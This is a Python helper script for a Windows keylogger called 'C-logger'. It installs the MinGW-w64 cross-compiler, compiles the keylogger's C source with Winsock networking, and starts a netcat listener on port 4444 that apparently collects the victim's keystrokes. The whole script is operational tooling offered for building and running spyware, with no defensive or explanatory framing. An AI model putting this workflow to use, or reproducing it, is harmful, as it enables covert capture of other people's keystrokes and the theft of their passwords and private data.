import sys
import os

print('''
   ad8888888888ba
 dP'         `"8b,
 8  ,aaa,       "Y888a     ,aaaa,     ,aaa,  ,aa,
 8  8' `8           "88baadP""""YbaaadP"""YbdP""Yb
 8  8   8              """        """      ""    8b
 8  8, ,8         ,aaaaaaaaaaaaaaaaaaaaaaaaddddd88P
 8  `"""'       ,d8""
 Yb,         ,ad8"    C-logger
  "Y8888888888P"      By: Liam Wood

  

''')

print("-" * 65)
print("Would you like to install MinGW-w64 (If you have it installed type no)")
options = input('Install: ')

if options == "yes" :

	os.system(" apt-get install -y mingw-w64")
	os.system("clear")
	
elif options == "no" :
	os.system("clear")

	
print("Would you like to compile the keylogger")
comp = input("(yes or no): ")

if comp == "yes":
	print("Compiling the keylogger")
	os.system("x86_64-w64-mingw32-gcc c-logger.c -o c-logger -lwsock32")
	os.system("clear")
	os.system("nc -nvlp 4444")
		
elif comp == "no":
	os.system("clear")
	os.system("nc -nvlp 4444")	
